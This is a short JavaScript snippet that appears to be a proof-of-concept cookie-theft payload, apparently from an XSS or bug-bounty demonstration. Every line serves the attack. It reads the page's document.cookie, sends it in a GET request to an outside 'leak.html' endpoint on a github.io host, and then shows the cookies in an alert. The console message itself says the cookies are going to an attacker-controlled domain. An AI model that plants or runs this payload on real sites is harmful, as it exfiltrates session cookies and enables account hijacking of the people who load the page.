console.log('Cookies are being sent to attacker-controlled domain silently....');

var xhr = new XMLHttpRequest();

//send cookies to attacker endpoint

xhr.open("GET", "https://esw1234.github.io/npachpande/W-12276431/leak.html?cookies="+document.cookie, false);

xhr.send();

alert(document.cookie);
